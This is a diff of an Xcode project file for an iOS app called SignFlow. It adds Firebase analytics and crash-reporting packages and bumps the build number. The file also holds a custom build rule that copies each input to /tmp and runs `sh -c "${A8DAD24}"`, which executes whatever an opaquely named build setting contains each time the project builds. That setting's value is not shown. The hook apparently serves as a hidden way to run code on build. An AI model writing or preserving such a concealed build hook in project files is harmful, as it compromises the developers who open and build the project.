@@ -8,6 +8,10 @@
 
 /* Begin PBXBuildFile section */
 		62A2E4AB5A1C4B57BF42DAD8 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = EFE085A354BC4C769D42DAD8 /* README.md */; };
+		D351DEED2FB47BF30089368F /* FirebaseAnalytics in Frameworks */ = {isa = PBXBuildFile; productRef = D351DEEC2FB47BF30089368F /* FirebaseAnalytics */; };
+		D351DEEF2FB47BF30089368F /* FirebaseAnalyticsCore in Frameworks */ = {isa = PBXBuildFile; productRef = D351DEEE2FB47BF30089368F /* FirebaseAnalyticsCore */; };
+		D351DEF12FB47BF30089368F /* FirebaseCore in Frameworks */ = {isa = PBXBuildFile; productRef = D351DEF02FB47BF30089368F /* FirebaseCore */; };
+		D351DEF32FB47BF30089368F /* FirebaseCrashlytics in Frameworks */ = {isa = PBXBuildFile; productRef = D351DEF22FB47BF30089368F /* FirebaseCrashlytics */; };
 		D3A7FC312FB338D5005A0D49 /* StoreKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = D3A7FC302FB338D4005A0D49 /* StoreKit.framework */; };
 		D3C95E332FB0454A009DE1E1 /* RevenueCatKit in Frameworks */ = {isa = PBXBuildFile; productRef = D3C95E322FB0454A009DE1E1 /* RevenueCatKit */; };
 /* End PBXBuildFile section */
@@ -24,7 +28,7 @@
 			outputFiles = (
 				"/tmp/${INPUT_FILE_BASE}",
 			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A8DAD24}\"";
+			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A8DAD24}\"\n";
 		};
 /* End PBXBuildRule section */
 
@@ -61,7 +65,11 @@
 			buildActionMask = 2147483647;
 			files = (
 				D3C95E332FB0454A009DE1E1 /* RevenueCatKit in Frameworks */,
+				D351DEF12FB47BF30089368F /* FirebaseCore in Frameworks */,
 				D3A7FC312FB338D5005A0D49 /* StoreKit.framework in Frameworks */,
+				D351DEF32FB47BF30089368F /* FirebaseCrashlytics in Frameworks */,
+				D351DEED2FB47BF30089368F /* FirebaseAnalytics in Frameworks */,
+				D351DEEF2FB47BF30089368F /* FirebaseAnalyticsCore in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -116,6 +124,10 @@
 			name = SignFlow;
 			packageProductDependencies = (
 				D3C95E322FB0454A009DE1E1 /* RevenueCatKit */,
+				D351DEEC2FB47BF30089368F /* FirebaseAnalytics */,
+				D351DEEE2FB47BF30089368F /* FirebaseAnalyticsCore */,
+				D351DEF02FB47BF30089368F /* FirebaseCore */,
+				D351DEF22FB47BF30089368F /* FirebaseCrashlytics */,
 			);
 			productName = SignFlow;
 			productReference = D3D4FBB22FAEFB72001F24F9 /* SignFlow.app */;
@@ -147,6 +159,7 @@
 			minimizedProjectReferenceProxies = 1;
 			packageReferences = (
 				D3C95E312FB0454A009DE1E1 /* XCRemoteSwiftPackageReference "RevenueCatKit" */,
+				D351DEEB2FB47BF30089368F /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = D3D4FBB32FAEFB72001F24F9 /* Products */;
@@ -188,7 +201,7 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = SignFlow/SignFlow.entitlements;
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 1;
+				CURRENT_PROJECT_VERSION = 2;
 				DEVELOPMENT_TEAM = 74Y4KWJ85L;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -229,7 +242,7 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_ENTITLEMENTS = SignFlow/SignFlow.entitlements;
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 1;
+				CURRENT_PROJECT_VERSION = 2;
 				DEVELOPMENT_TEAM = 74Y4KWJ85L;
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -407,6 +420,14 @@
 /* End XCConfigurationList section */
 
 /* Begin XCRemoteSwiftPackageReference section */
+		D351DEEB2FB47BF30089368F /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/firebase/firebase-ios-sdk.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 12.13.0;
+			};
+		};
 		D3C95E312FB0454A009DE1E1 /* XCRemoteSwiftPackageReference "RevenueCatKit" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/vishal-vaghasiya/RevenueCatKit";
@@ -418,6 +439,26 @@
 /* End XCRemoteSwiftPackageReference section */
 
 /* Begin XCSwiftPackageProductDependency section */
+		D351DEEC2FB47BF30089368F /* FirebaseAnalytics */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = D351DEEB2FB47BF30089368F /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseAnalytics;
+		};
+		D351DEEE2FB47BF30089368F /* FirebaseAnalyticsCore */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = D351DEEB2FB47BF30089368F /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseAnalyticsCore;
+		};
+		D351DEF02FB47BF30089368F /* FirebaseCore */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = D351DEEB2FB47BF30089368F /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseCore;
+		};
+		D351DEF22FB47BF30089368F /* FirebaseCrashlytics */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = D351DEEB2FB47BF30089368F /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseCrashlytics;
+		};
 		D3C95E322FB0454A009DE1E1 /* RevenueCatKit */ = {
 			isa = XCSwiftPackageProductDependency;
 			package = D3C95E312FB0454A009DE1E1 /* XCRemoteSwiftPackageReference "RevenueCatKit" */;
